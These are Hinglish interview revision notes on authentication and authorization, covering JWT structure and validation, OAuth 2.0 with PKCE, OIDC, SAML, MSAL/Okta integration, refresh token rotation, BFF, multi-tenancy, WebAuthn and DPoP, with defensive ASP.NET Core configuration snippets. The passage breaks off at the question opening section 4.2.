# Authentication & Authorization — Interview Revision Notes

> Quick-revision Q&A `D. Authentication-Authorization-Interview-Guide.md` se derive kiye gaye hain. Source ka har section cover karta hai.

## 1. Core Concepts

### 1.1 Authentication vs Authorization

**Q: Authentication aur Authorization mein kya farak hai?**

A: Authentication "tum ho kaun" ka jawab deta hai (login process, `UseAuthentication()` ke through `HttpContext.User` populate karta hai). Authorization "tum kya kar sakte ho" ka jawab deta hai (claims/roles/policies jo `UseAuthorization()` ke through `[Authorize]` requirements ke against evaluate hoti hain).

**Q: Ek API expected 403 ki jagah 401 kyun return karta hai?**

A: 401 ka matlab hai authentication ne kabhi valid principal populate nahi kiya (missing/invalid/expired token) — pipeline authorization check tak nahi pahuncha. 403 ka matlab hai authentication succeed hua lekin role/policy check fail ho gaya.

### 1.2 Stateful Sessions vs Stateless Tokens

**Q: Stateful sessions ko stateless tokens ke saath contrast karo.**

A:
- Stateful sessions: server `sessionId -> userId, roles, expiry` store karta hai (memory/Redis/DB); client sirf ek random `sessionId` cookie hold karta hai. Fayde: easy revocation, server truth control karta hai. Nuksan: session state store/scale karna zaroori hai.
- Stateless tokens (JWT common format hai): server ek self-contained token issue karta hai; client har request mein isse bhejta hai; server cryptographically verify karta hai, koi session store nahi. Fayde: horizontally scalable. Nuksan: harder revocation, careful design zaroori.

**Q: Kya JWT "stateless" ka synonym hai?**

A: Nahi — JWT stateless approach ke andar use hone wala ek common token *format* hai, approach khud nahi.

```mermaid
flowchart LR
    subgraph Stateful["Stateful Session"]
    A1[Client] -- sessionId cookie --> A2[Server]
    A2 -- lookup --> A3[(Session Store\nRedis/DB)]
    end
    subgraph Stateless["Stateless JWT"]
    B1[Client] -- JWT --> B2[Server]
    B2 -- verify signature\nno DB call --> B2
    end
```

### 1.3 Basic Authentication (Legacy)

**Q: Basic Authentication kaise kaam karta hai aur yeh risky kyun hai?**

A: Client `Authorization: Basic base64(username:password)` har request par bhejta hai. Base64 encoding hai, encryption nahi — credentials intercept hone par trivially recover ho jaate hain. Koi expiry/revocation nahi, aur captured requests indefinitely replay ho sakte hain. Hamesha HTTPS par chalna chahiye; abhi bhi legacy/internal system-to-system compatibility ke liye use hota hai.

```
Authorization: Basic dXNlcjpwYXNzd29yZA==
```

**Q: Replay attack define karo.**

A: Ek attacker ek valid authenticated request/token capture karta hai aur baad mein resend karta hai access paane ke liye bina credentials jaane. Basic Auth (aur bina freshness checks ke koi bhi bearer scheme) inherently susceptible hai jab tak TLS + short-lived credentials + nonces se mitigate na kiya jaaye.

### 1.4 What JWT Actually Is

**Q: JWT kya hai, aur yeh JWS/JWE/JOSE se kaise related hai?**

A: JWT ek compact, URL-safe JSON-claims string hai. Signed = JWS (JSON Web Signature); encrypted = JWE (JSON Web Encryption). Dono JOSE family ke part hain, JWK (key format) aur JWA (algorithm names jaise `HS256`/`RS256`) ke saath. Zyada tar log "JWT" kehte hain lekin unka matlab JWS hota hai.

**Q: Kya ek signed JWT confidential hota hai?**

A: Nahi. Jiske paas bhi yeh hai wo payload ko Base64URL-decode karke padh sakta hai. Ek signature integrity deta hai (undetected alter nahi ho sakta) aur authenticity (verifiable issuer) — confidentiality nahi. Confidentiality ke liye JWE use karo, token mein sensitive data avoid karo, ya opaque tokens + introspection use karo.

**Q: JWT kaun sa encoding use karta hai aur kyun?**

A: Base64URL (`+`→`-`, `/`→`_`, padding aksar omit hota hai) — URLs mein special meaning wale characters avoid karta hai taaki token bina escaping ke URLs/headers/cookies mein travel kar sake. Encoding abhi bhi security nahi hai.

### 1.5 JWT Anatomy — Header, Payload, Signature

**Q: Ek signed JWT ke teen parts kya hain?**

A: `Header.Payload.Signature`, har ek Base64URL-encoded.
- Header: `alg` (signing algorithm), `typ` (usually `JWT`), `kid` (JWKS lookup ke liye key ID).
- Payload: claims (`iss`, `aud`, `sub`, `exp`, `iat`, `nbf`, custom claims jaise `scope`/`role`).
- Signature: `base64url(header) + "." + base64url(payload)` par `alg`-named algorithm use karke compute ki jaati hai; verify karta hai ki header+payload exactly wahi hai jo issuer ne sign kiya.

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-2026-05"
}
```

```json
{
  "iss": "https://auth.mycompany.com",
  "aud": "my-api",
  "sub": "user_123",
  "exp": 1760000000,
  "iat": 1759996400,
  "nbf": 1759996400,
  "scope": "orders:read orders:write",
  "role": "admin"
}
```

```mermaid
flowchart TB
    H["Header (JSON)\nalg, typ, kid"] --> B64H["Base64URL"]
    P["Payload (JSON claims)\niss, aud, sub, exp..."] --> B64P["Base64URL"]
    B64H --> CONCAT["base64url(header) + '.' + base64url(payload)"]
    B64P --> CONCAT
    CONCAT --> SIGN["Sign with alg + key"]
    SIGN --> JWT["Header.Payload.Signature"]
```

### 1.6 Claims: Registered, Public, Private

**Q: Standard registered JWT claims kya hain?**

A: `iss` (issuer), `sub` (subject/user id), `aud` (audience), `exp` (expiry), `iat` (issued at), `nbf` (not-before), `jti` (unique token id, revocation lists ke liye useful).

**Q: Public aur private claims mein farak?**

A: Public claims globally unique/collision-resistant names use karte hain (aksar URIs) taaki unrelated parties clash na karein. Private claims aapke apne app-specific fields hote hain (e.g., `employeeId`, `tenantId`, `Department`).

## 2. Intermediate

### 2.1 Signing Algorithms: HS256 vs RS256 vs ES256

**Q: HS256, RS256, aur ES256 compare karo.**

A:
- HS256 (HMAC-SHA256, symmetric): ek secret sign aur verify dono karta hai; jo verify kar sakta hai wo forge bhi kar sakta hai. Single controlled authority ke liye achha; kaafi verifiers ke saath risky (secret sprawl).
- RS256 (RSA, asymmetric): private key sign karti hai, public key verify karti hai. Safer distribution (JWKS publish karo); microservices/third-party verification ke liye achha.
- ES256 (ECDSA, asymmetric): RS256 jaisa hi split lekin smaller keys/tokens, aksar faster verification; thoda zyada library/HSM friction.

**Q: Signing algorithm choose karne ka rule of thumb?**

A: RS256/ES256 use karo jab ek se zyada service tokens verify karti hai. HS256 sirf tab use karo jab aap har verifier control karte ho aur shared secret protect kar sakte ho.

### 2.2 Where JWTs Live in HTTP & Storage Trade-offs

**Q: JWTs typically kaha travel karte hain, aur browser storage trade-offs kya hain?**

A: Sabse common: `Authorization: Bearer <token>` header; alternative: HttpOnly Secure cookie.
- `localStorage`/`sessionStorage`: JS-readable → high XSS risk, koi CSRF risk nahi (auto-sent nahi hota).
- HttpOnly cookie: JS-readable nahi → low XSS risk, lekin CSRF risk (auto-attached) → CSRF protection chahiye.

Koi universally perfect answer nahi hai — threat model par depend karta hai; SPA+API teams aksar HttpOnly cookies + CSRF prefer karti hain, ya ek BFF pattern jo tokens ko browser se bilkul door rakhta hai.

### 2.3 Access Tokens vs Refresh Tokens

**Q: Access tokens aur refresh tokens ko contrast karo.**

A: Access token: short-lived (5–30 min), har API call par sent, revoke karna hard (stateless), usually JWT. Refresh token: long-lived (days/weeks), sirf auth endpoint ko sent, revoke karna easy (server-side record), usually ek **opaque** random string.

**Q: Refresh tokens usually opaque kyun hote hain, JWT ki jagah?**

A: Aapko easy server-side revocation aur rotation tracking chahiye — ek opaque token sirf ek DB/Redis lookup key hai jo aap fully control karte ho, jisme koi self-contained claims stale hone ke liye nahi hote.

### 2.4 Full Login → API → Refresh Flow

**Q: Login → API call → refresh sequence explain karo.**

A:
1. Client `POST /login` credentials ke saath.
2. Auth server validate karta hai, Access Token (JWT) + Refresh Token (opaque) return karta hai.
3. Client API ko `Authorization: Bearer <access token>` ke saath call karta hai; API signature/`iss`/`aud`/`exp` validate karta hai.
4. Jab access token expire hota hai, client `POST /refresh` refresh token ke saath karta hai.
5. Auth server validate karta hai aur rotate karta hai, ek naya access token + naya refresh token return karta hai (purana invalidated).

```mermaid
sequenceDiagram
    participant C as Client
    participant AS as Auth Server
    participant API as Resource API

    C->>AS: POST /login (credentials)
    AS->>AS: Validate credentials
    AS-->>C: Access Token (JWT) + Refresh Token (opaque)
    C->>API: GET /orders (Authorization: Bearer <access token>)
    API->>API: Validate signature, iss, aud, exp
    API-->>C: 200 OK (data)
    Note over C,API: ...time passes, access token expires...
    C->>AS: POST /refresh (refresh token)
    AS->>AS: Validate refresh token, rotate it
    AS-->>C: New Access Token + New Refresh Token (old one invalidated)
```

**Q: Iss flow mein "rotation" ka matlab kya hai?**

A: Har refresh par ek brand-new refresh token generate hota hai aur purana invalidate ho jaata hai — theft detect karne mein madad karta hai (dekho 3.8).

### 2.5 JWT Validation — What Actually Happens Internally

**Q: Ek correct JWT verifier actually kya karta hai, "signature aur expiry check karo" se aage?**

A:
1. Header + payload parse karo bina kisi field par abhi trust kiye.
2. Key ko safely select karo — public key `kid` se ek trusted, pre-configured JWKS se pick karo; kabhi bhi wo URL se keys fetch mat karo jis par token khud point karta hai (`jku`/`x5u` injection).
3. Signature verify karo us algorithm se jo *aapne* server-side configure kiya, kabhi token ke apne `alg` claim se nahi.
4. `exp` (future, thoda clock skew ke saath), `nbf` (≤ now), `iss` (expected), `aud` (aapka API include karta hai) validate karo.
5. Authorize: requested resource ke against scopes/roles/permissions check karo.
6. Optional hardening: `jti` ko revocation list ke against check karo, `tenantId` context se match karta hai check karo, `typ`/`token_use` check karo taaki refresh token ko access token ke roop mein replay na kiya ja sake.

**Q: Interview mein explicitly state karne wala key idea kya hai?**

A: Signature prove karta hai ki issuer ne token banaya; claims validation prove karta hai ki yeh aapke liye hai aur abhi bhi valid hai — dono zaroori hain. Sirf signature mention karna incomplete answer hai.

### 2.6 Claims vs Roles vs Policy-Based Authorization

**Q: Role, Claim, aur Policy define karo.**

A: Role = simple grouping (`Admin`, `User`). Claim = key-value pair (`Department=Finance`). Policy = ek named, centrally-registered rule jo claims/roles/custom logic se banti hai.

**Q: Claims/policies roles se better scale kyun karte hain?**

A: Roles requirements narrow hone ke saath combinatorially multiply hote hain (`RegionAdmin`, `FinanceRegionAdmin`...). Claims attributes independently express karte hain aur policies mein combine hote hain bina role table explode kiye. Policies decision logic ko `AddAuthorization()` mein centralize karti hain — one source of truth, auditability ke liye critical.

```csharp
[Authorize(Roles = "Admin")] // role-based
if (!User.HasClaim("Department", "IT")) return Forbid(); // claims-based, inline
builder.Services.AddAuthorization(o => o.AddPolicy("ITOnly", p => p.RequireClaim("Department", "IT")));
[Authorize(Policy = "ITOnly")] // policy-based
```

**Q: Policy-based authorization ka ek pitfall kya hai?**

A: Overly complex nested policies unit test/debug karna hard hai (failed policy sirf 403 return karta hai bahut kam detail ke saath). Custom `IAuthorizationHandler`s se mitigate karo jo log karte hain *kyun* requirement fail hui; policies ko small aur composable rakho.

### 2.7 The 7 ASP.NET Core Authorization Styles

**Q: 7 ASP.NET Core authorization styles list aur describe karo.**

A:
1. Simple — `[Authorize]`, sirf ek authenticated user chahiye.
2. Role-based — `[Authorize(Roles = "Admin,Manager")]`, `ClaimTypes.Role` check karta hai.
3. Policy-based — named policies ek baar register hoti hain, `[Authorize(Policy = "...")]` ke through reference; trivial checks se aage recommended default.
4. Claims-based — policy mein `RequireClaim(...)` ya manual `User.HasClaim(...)`.
5. Custom requirement-based — `IAuthorizationRequirement` + `AuthorizationHandler<T>` logic ke liye jo declarative nahi ho sakti (e.g. clearance ≥ classification).
6. Endpoint-specific — Minimal APIs ka `.RequireAuthorization("PolicyName")` route registration par chained; same policy engine, different syntax.
7. Resource-based — `IAuthorizationService.AuthorizeAsync(User, resource, policy)`; decision specific object par depend karta hai (e.g., document ownership), sirf claims par nahi — resource pehle load karna zaroori hai.

```csharp
public class DocumentAuthHandler : AuthorizationHandler<SameAuthorRequirement, Document>
{
    protected override Task HandleRequirementAsync(AuthorizationHandlerContext context,
        SameAuthorRequirement requirement, Document resource)
    {
        if (resource.OwnerId == context.User.FindFirstValue(ClaimTypes.NameIdentifier))
            context.Succeed(requirement);
        return Task.CompletedTask;
    }
}
```

## 3. Advanced

### 3.1 OAuth 2.0 — Roles, Flows, and Grant Types

**Q: OAuth 2.0 kya hai, aur uske char roles kya hain?**

A: Ek authorization framework jo user ko apna data ek third-party app ko dene deta hai bina credentials share kiye (khud ek authentication protocol nahi — OIDC wo add karta hai). Roles: Resource Owner (user), Client (app), Authorization Server (authenticate + tokens issue karta hai), Resource Server (protected resources host karta hai).

**Q: Authorization Code flow ("Login with Google") ke through walk karo.**

A: User login click karta hai → app Google ke auth endpoint par redirect karta hai → user authenticate/consent karta hai → Google ek authorization code ke saath back redirect karta hai → app code ko server-to-server tokens ke liye exchange karta hai (client secret ya PKCE verifier ke saath) → app access token use karke API call karta hai.

```
GET https://accounts.google.com/o/oauth2/auth
    ?client_id=YOUR_CLIENT_ID
    &redirect_uri=https://yourapp.com/callback
    &response_type=code
    &scope=email profile
```

```
POST https://oauth2.googleapis.com/token
Content-Type: application/x-www-form-urlencoded

client_id=YOUR_CLIENT_ID
&client_secret=YOUR_CLIENT_SECRET
&code=AUTHORIZATION_CODE
&grant_type=authorization_code
&redirect_uri=https://yourapp.com/callback
```

```json
{
  "access_token": "ya29.a0AR...",
  "expires_in": 3600,
  "token_type": "Bearer",
  "refresh_token": "1//0g..."
}
```

### 3.2 OAuth2 Grant Types: Which Are Deprecated/Unsafe

**Q: Kaun se OAuth2 grant types current standard hain vs deprecated?**

A: Current: Authorization Code (+PKCE) user-present apps ke liye; Client Credentials M2M ke liye; Refresh Token; Device Code input-constrained devices ke liye. Deprecated: Implicit (token URL fragment mein exposed, koi code exchange nahi, koi refresh token nahi — OAuth 2.1 mein removed) aur Resource Owner Password Credentials/ROPC (app raw credentials handle karta hai, OAuth ka purpose defeat karta hai, MFA support nahi — OAuth 2.1 mein removed).

**Q: Agar Implicit flow dead hai, to modern SPAs tokens kaise paate hain?**

A: Authorization Code + PKCE — PKCE client secret ki zarurat hatata hai jabki secure code-exchange model rakhta hai.

### 3.3 PKCE — Why It's Now Mandatory Even for Confidential Clients

**Q: PKCE kaise kaam karta hai?**

A:
1. Client random `code_verifier` generate karta hai, `code_challenge = BASE64URL(SHA256(code_verifier))` derive karta hai.
2. Auth request mein `code_challenge` + `code_challenge_method=S256` include hota hai.
3. Auth server issued code ke saath challenge store karta hai.
4. Token exchange mein original `code_verifier` include hota hai.
5. Server hash recompute karta hai aur compare karta hai — mismatch hone par exchange reject hota hai.

Yeh authorization code interception attacks ko defeat karta hai kyunki verifier client se kabhi bahar nahi jaata.

```mermaid
sequenceDiagram
    participant App as SPA (public client)
    participant AS as Authorization Server
    participant API as Resource API

    App->>App: Generate code_verifier, derive code_challenge (S256)
    App->>AS: Authorization request + code_challenge
    AS->>App: Redirect with authorization code
    App->>AS: Token request: code + code_verifier
    AS->>AS: Recompute SHA256(code_verifier), compare to stored challenge
    AS-->>App: Access Token + ID Token (+ Refresh Token if offline_access)
    App->>API: Bearer <access_token>
    API-->>App: Protected data
```

**Q: Confidential clients ke liye bhi ab PKCE kyun use karo?**

A: Defense in depth — ek confidential client ka code abhi bhi redirect step par intercept ho sakta hai (browser history, referrer leakage, logs). Yeh guidance simplify bhi karta hai ("hamesha PKCE use karo") aur client secret/certificate auth ke saath add karna cheap hai.

### 3.4 OAuth 2.0 vs OpenID Connect vs JWT

**Q: JWT, OAuth 2.0, aur OIDC ko cleanly separate karo.**

A: JWT = token format. OAuth 2.0 = authorization framework (delegated access). OIDC = OAuth 2.0 ke upar identity layer, ek standardized ID Token (hamesha JWT), `/userinfo` endpoint, aur login semantics add karta hai.

**Q: OIDC flow mein typically kaun se teen tokens issue hote hain?**

A: ID Token (client ko batata hai user kaun hai; hamesha JWT), Access Token (API calls authorize karta hai; JWT ya opaque), Refresh Token (bina re-login naye tokens deta hai; usually opaque).

**Q: ID tokens ke saath sabse common mistake kya hai?**

A: Apne API ko call karne ke liye ID token use karna. ID tokens client ke liye hain locally identity establish karne ke liye, resource servers ke liye nahi. APIs ko access tokens validate karne chahiye, jinka `aud` us API ke liye scoped hota hai.

### 3.5 SAML vs OIDC for SSO/Federation

**Q: SAML 2.0 aur OIDC compare karo.**

A: SAML: XML signed assertions, browser redirect/POST bindings, enterprise/legacy IdPs (ADFS), poor mobile/SPA fit, fragile Single Logout. OIDC: JWT/JSON, compact URL-safe tokens, modern web/mobile/API-first, PKCE-friendly, simpler RP-Initiated Logout, JWKS-based key rotation.

**Q: Kya aap ek naye project ke liye SAML introduce karoge?**

A: Nahi, choice se nahi — sirf jab kisi existing enterprise IdP/partner ke saath integrate karna ho jo ise mandate karta ho. New projects OIDC default karte hain; ek identity broker (Azure AD, Okta, Auth0, Keycloak) upstream SAML ko downstream OIDC se bridge kar sakta hai.

### 3.6 Azure AD (Entra ID) + Angular MSAL Implementation

**Q: Angular + MSAL Azure AD ke against kaun sa flow use karta hai, aur yeh end-to-end kaise kaam karta hai?**

A: Authorization Code Flow with PKCE. Entra ID mein SPA app register karo (redirect URI, App/Tenant IDs), API permissions configure karo, optionally backend API ko ek scope ke saath expose karo, `@azure/msal-browser`/`@azure/msal-angular` install karo, MSAL configure karo (clientId/tenantId/redirectUri, `sessionStorage` mein cache), `MsalGuard` se routes protect karo, `loginRedirect()`/`logoutRedirect()` use karo, MSAL interceptor ko tokens automatically attach karne do, aur .NET API ko Microsoft.Identity.Web se secure karo Azure AD ke OIDC metadata/JWKS ke against validate karte hue.

```
Angular App → Azure AD Login Page
       | Authorization Code + PKCE
       v
Azure AD issues Access Token / ID Token
       |
       v
Angular calls .NET API with Bearer Token
```

**Q: Azure AD/MSAL ke common pitfalls aur best practices kya hain?**

A: Pitfalls — wrong redirect URI, missing admin consent, over-broad scopes, CORS misconfig, deprecated implicit flow use karna, audience mismatch. Best practices — Authorization Code + PKCE, tokens ko manually store mat karo (MSAL ko cache manage karne do), HTTPS only, least-privilege scopes, conditional access policies, sign-in logs monitor karo.

### 3.7 Okta PKCE + Refresh Token + .NET API Implementation

**Q: Okta + Angular + .NET token flow kaise kaam karta hai?**

A: Angular (`@okta/okta-angular`/`okta-auth-js`) `code_verifier`/`code_challenge` generate karta hai, Okta login par redirect karta hai, ek authorization code receive karta hai, use Access/ID/Refresh tokens ke liye exchange karta hai, ek interceptor `Authorization: Bearer <token>` attach karta hai, aur `autoRenew` expire hone se pehle silently refresh karta hai. .NET API ko sirf Okta ke `Authority`/`Audience` par point kiya standard JWT bearer config chahiye — middleware OIDC discovery metadata (JWKS including) automatically fetch karta hai aur keys transparently rotate karta hai.

```typescript
const oktaAuth = new OktaAuth({
  issuer: 'https://YOUR_OKTA_DOMAIN/oauth2/default',
  clientId: 'YOUR_CLIENT_ID',
  redirectUri: window.location.origin + '/login/callback',
  scopes: ['openid', 'profile', 'email']
});
```

```mermaid
flowchart TD
    A[User clicks login] --> B[Angular generates code_verifier]
    B --> C[Creates code_challenge]
    C --> D[Redirect to Okta login]
    D --> E[User authenticates]
    E --> F[Okta returns Authorization Code]
    F --> G["Angular sends code + code_verifier"]
    G --> H["Okta issues Access Token, ID Token, Refresh Token"]
    H --> I[Access token used for API calls]
    I --> J[Access token expires]
    J --> K[Refresh token silently generates new access token]
```

```csharp
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(o => { o.Authority = "https://dev-12345.okta.com/oauth2/default"; o.Audience = "api://default"; });
```

**Q: `offline_access` scope kyun zaroori hai?**

A: Iske bina, authorization server sirf access/ID tokens issue karta hai — koi refresh token bilkul return nahi hota.

### 3.8 Refresh Token Rotation & Reuse Detection

**Q: Refresh token rotation kya hai, aur yeh akela kyun kaafi nahi hai?**

A: Har refresh ek naya refresh token issue karta hai aur purane ko invalidate kar deta hai, jisse stolen token ki useful window narrow ho jaati hai — lekin rotation akela theft *detect* nahi karta.

**Q: Reuse detection kaise kaam karta hai?**

A: Har used refresh token ko "consumed" mark karo (delete nahi). Agar ek consumed token phir se present hota hai, yeh theft signal karta hai (ek legitimate client ke paas hamesha sirf latest token hota hai). Reuse detect hone par, poora token family/session chain revoke karo, full re-authentication force karte hue.

```mermaid
sequenceDiagram
    participant U as Legitimate User
    participant A as Attacker (stole RT1)
    participant S as Auth Server

    U->>S: Refresh with RT1
    S->>S: Mark RT1 consumed, issue RT2
    S-->>U: New Access Token + RT2
    A->>S: Refresh with RT1 (stolen, already consumed)
    S->>S: Detect reuse of consumed token
    S->>S: Revoke entire token family (RT1, RT2, ...)
    S-->>A: 401 Unauthorized
    Note over U,S: Legitimate user is also logged out —\ntrade-off: security over convenience
```

**Q: Poori family revoke karne ka trade-off kya hai?**

A: Legitimate user bhi log out ho jaata hai agar uska token wo stolen wala tha — ek intentional fail-safe; sirf reused token revoke karna attacker ke rotated descendant ko abhi bhi valid chhod deta.

### 3.9 Securing SPA-to-API Auth: BFF Pattern vs Token-in-Browser

**Q: BFF (Backend-for-Frontend) pattern kya hai aur yeh token-in-browser se kaise differ karta hai?**

A: Token-in-browser: SPA (even HttpOnly cookie ke through) ultimately ek token ke saath hota hai jo browser ke origin se reachable hota hai. BFF: browser kabhi OAuth token dekhta hi nahi — SPA sirf apne backend (BFF) ke saath ek plain session cookie hold karta hai, jo khud OAuth/OIDC dance karta hai (ek confidential client ke roop mein) aur downstream APIs call karte waqt server-side access token attach karta hai.

```mermaid
flowchart LR
    Browser["Browser (SPA)"] -- "Session cookie only\n(HttpOnly, Secure, SameSite)" --> BFF["BFF (your backend)"]
    BFF -- "OAuth Authorization Code + PKCE\n(server-to-server)" --> AS["Authorization Server"]
    BFF -- "Access token attached server-side" --> API["Resource API"]
```

**Q: BFF vs token-in-browser ka trade-off kya hai?**

A: BFF "browser mein token kaha safely store karu" wala problem eliminate karta hai aur browser apps ke liye OAuth BCP-recommended approach hai, extra backend component ki cost par. Token-in-browser simpler hai aur mobile/Postman ke liye natural fit hai lekin browser ko token ki trust boundary ke andar rakhta hai.

### 3.10 ASP.NET Core Identity Customization

**Q: Main ASP.NET Core Identity customization points kya hain?**

A:
- Custom `IdentityUser` subclass (`AppUser : IdentityUser<Guid>`) extra properties ke saath + matching `IdentityDbContext`.
- Custom `IPasswordValidator<TUser>`/`IUserValidator<TUser>` org policy ke liye.
- Custom `UserClaimsPrincipalFactory<TUser>` sign-in par extra claims inject karne ke liye.
- Identity ko user/credential management ke liye use karo (`SignInManager`, `UserManager`) lekin API auth ke liye apne khud ke JWTs issue karo Identity ke cookie auth par rely karne ki jagah.
- `AddIdentityCore<TUser>()` (no cookie/UI scaffolding) vs `AddIdentity<TUser,TRole>()` API-only backends ke liye.
- Custom `IUserStore<TUser>` jab users ek external system mein rehte hain (legacy DB, Azure AD).

```csharp
// API-only Identity setup — no cookie/UI scaffolding
builder.Services.AddIdentityCore<AppUser>(options =>
    {
        options.Password.RequiredLength = 12;
        options.User.RequireUniqueEmail = true;
    })
    .AddRoles<AppRole>()
    .AddEntityFrameworkStores<AppDbContext>()
    .AddDefaultTokenProviders();

builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(/* ... */);
```

**Q: Apne API ke liye Identity ka built-in cookie auth kyun nahi use karte?**

A: Cookie auth browser/session-oriented hai aur naturally non-browser clients (mobile, service-to-service) serve nahi karta ya statelessly scale nahi karta. Identity user/credential/role management ke liye right rehta hai; JWT issuance/validation API authentication handle karta hai.

### 3.11 Multi-Tenant Authentication & Authorization

**Q: Tenant identity kaha rehni chahiye?**

A: Ya to token mein ek `tenantId` claim ke roop mein (simplest, lekin tenant changes ke liye token re-issue chahiye) ya request se derived (subdomain/header/route) jo user ke allowed tenants ke against cross-checked ho (more flexible, extra per-request lookup).

**Q: Per-tenant identity providers ko kaise handle karte ho?**

A: Ek tenant claim ke saath Shared IdP B2C SaaS ke liye common hai. Per-tenant IdP (har enterprise apna Azure AD/Okta laata hai) ko dynamic issuer validation chahiye — `ValidIssuers`/ek custom `IssuerValidator` delegate jo expected issuer per tenant resolve karta hai.

**Q: #1 real-world multi-tenant bug class kya hai?**

A: Cross-tenant data leakage — har data query tenant-scoped hona chahiye; JWT ke `tenantId` claim par akela rely mat karo, data-access layer par bhi enforce karo (e.g., EF Core global query filters) defense in depth ke roop mein.

```csharp
options.TokenValidationParameters = new TokenValidationParameters {
    ValidateIssuer = true,
    IssuerValidator = (issuer, token, parameters) =>
        _tenantIssuerResolver.IsKnownIssuer(issuer) ? issuer
        : throw new SecurityTokenInvalidIssuerException("Unknown tenant issuer"),
    ValidateAudience = true,
};
```

### 3.12 WebAuthn / FIDO2 / Passkeys

**Q: WebAuthn/passkeys ke peeche core cryptographic idea kya hai?**

A: Asymmetric key pairs jo per device, per origin generate hote hain — steal karne layak koi shared secret nahi. Private key authenticator se kabhi bahar nahi jaata (secure enclave/TPM); sirf public key + `credentialId` server-side store hote hain. Har key pair ek single origin se bound hota hai, isliye sites ke across kuch bhi reusable nahi hai.

**Q: WebAuthn passwords/OTP se different tarike se phishing-resistant kyun hai?**

A: Passwords/OTP strings hain jinhe ek user (ya autofill) ek phishing clone par enter karne ke liye trick kiya ja sakta hai. Ek WebAuthn credential browser/OS khud se cryptographically origin se bound hota hai — authenticator sirf us origin ke liye sign karega jiske against yeh register hua tha, isliye ek different origin par phishing site ek valid assertion obtain nahi kar sakti. OTP-based MFA abhi bhi real-time adversary-in-the-middle phishing proxies ke liye vulnerable rehta hai; WebAuthn human-trust step ko entirely remove kar deta hai.

**Q: Registration aur authentication ceremonies describe karo.**

A:
- Registration (attestation): server ek random challenge + RP info bhejta hai; browser `navigator.credentials.create()` call karta hai; authenticator ek naya key pair generate karta hai, challenge sign karta hai, public key + `credentialId` return karta hai; server public key account ke against store karta hai.
- Authentication (assertion): server ek naya challenge bhejta hai; browser `navigator.credentials.get()` call karta hai; authenticator ek local gesture maangta hai aur stored private key se challenge sign karta hai; server stored public key ke against signature verify karta hai.

```mermaid
sequenceDiagram
    participant U as User
    participant B as Browser/Authenticator
    participant S as Server (Relying Party)

    Note over U,S: Authentication ceremony (login with an existing passkey)
    B->>S: Request login challenge for user
    S->>S: Generate random challenge, store temporarily
    S-->>B: Challenge + allowed credentialId(s)
    B->>U: Prompt for local gesture (biometric/PIN/security key)
    U->>B: Approve (local only — never sent to server)
    B->>B: Sign challenge with device-bound private key
    B->>S: Signed assertion + credentialId
    S->>S: Look up stored public key for credentialId, verify signature against challenge
    S-->>B: Authenticated (issue session/JWT as usual)
```

**Q: WebAuthn ASP.NET Core app mein kaise fit hota hai, aur kya yeh MFA ko replace karta hai?**

A: ASP.NET Core Identity native passkey support add kar rahi hai; long-standing option `Fido2NetLib` hai server-side ceremonies ke liye. Architecturally, server Relying Party hai, passwords ki jagah public keys store karta hai, aur ceremony succeed hone ke baad normal session/JWT issue karta hai. Passkeys ko aksar inherently multi-factor consider kiya jaata hai (something you have + something you are/know), though yeh "count" hota hai MFA ke roop mein ya nahi ek policy decision hai, technical guarantee nahi.

### 3.13 DPoP (RFC 9449 — Demonstrating Proof of Possession)

**Q: DPoP kaun sa problem solve karta hai?**

A: Bearer tokens (JWT ya opaque) jo bhi hold karta hai usable hote hain — ek stolen token kahi se bhi replay ho sakta hai, aur server attacker ko legitimate client se differentiate nahi kar sakta. DPoP ek token ko us specific client se cryptographically bind karta hai jisne use request kiya.

**Q: DPoP mechanically kaise kaam karta hai?**

A:
1. Client apna khud ka public/private key pair generate karta hai, locally hold kiya jaata hai (server ko kabhi nahi bheja jaata).
2. Har request ke liye, client ek short-lived DPoP proof JWT (method, URL, timestamp, `jti`) create karta hai apni private key se signed.
3. Token request time par, auth server client ki public key hash karta hai aur ise access token mein `cnf.jkt` ke roop mein embed karta hai.
4. Har API call par, client access token **aur** ek fresh DPoP proof bhejta hai (`Authorization: DPoP <token>` + `DPoP` header).
5. Resource server proof ka signature/method/URL/recency **aur** proof ke key hash ka token ke `cnf.jkt` se match check karta hai. Ek stolen token akela private key ke bina useless hota hai.

```csharp
// Conceptual shape of a DPoP proof JWT (client-side, signed with the client's private key)
// Header: { "typ": "dpop+jwt", "alg": "ES256", "jwk": { /* client's public key */ } }
// Payload:
// {
//   "jti": "unique-per-request-id",
//   "htm": "GET",
//   "htu": "https://api.example.com/orders",
//   "iat": 1730000000
// }
// The resource server verifies this proof's signature against the embedded jwk,
// then checks that SHA256(jwk) matches the "cnf": { "jkt": "<thumbprint>" } claim
// baked into the access token by the authorization server at issuance time.
```

**Q: DPoP vs mTLS — DPoP "lighter weight" kyun hai?**

A: mTLS TLS handshake ke dauraan exchanged ek full X.509 cert se bind karta hai (transport-layer proof, CA/cert lifecycle chahiye, service-to-service ke liye suit karta hai). DPoP ordinary JWTs aur client-generated keys use karke ek application-layer equivalent achieve karta hai — koi CA ya infra changes nahi, jo ise SPAs/mobile ke liye practical banata hai. Trade-off: DPoP transport channel ko authenticate nahi karta aur server-side ek short-lived `jti` replay cache chahiye.

**Q: Agar aap already short-lived access tokens use karte ho, to DPoP ki zarurat kyun?**

A: Short expiry exposure ki *window* limit karta hai lekin us window ke andar replay rokne ke liye kuch nahi karta. DPoP complementary defense-in-depth hai jo ek stolen token ko client ki private key ke bina worthless bana deta hai.

## 4. Security & Performance

### 4.1 Why JWT Revocation Is Hard — and the Real Strategies

**Q: JWT revocation hard kyun hai, aur mitigation strategies kya hain?**

A: Ek self-contained JWT `exp` tak valid rehta hai regardless of logout/deactivation/theft. Strategies:
- Bahut short access token lifetime (5–15 min) — sabse common, refresh token revoke karo aur window wait karo.
- Revocation list/blacklist `jti` se — state/lookup cost reintroduce karta hai; high-value scenarios ke liye use karo.
- Token versioning (`ver` claim vs DB `userTokenVersion`) — abhi bhi per-request state check chahiye.
- Opaque tokens + introspection — fully revocable lekin per request ek network hop add karta hai.

Koi free lunch nahi hai — har option kuch statelessness trade away karta hai.

### 4.2 Opaque Tokens vs JWT for Revocation — the Real Trade-off

**Q: JWT-vs-opaque-token choice ko ek architectural decision ke roop mein frame karo.**

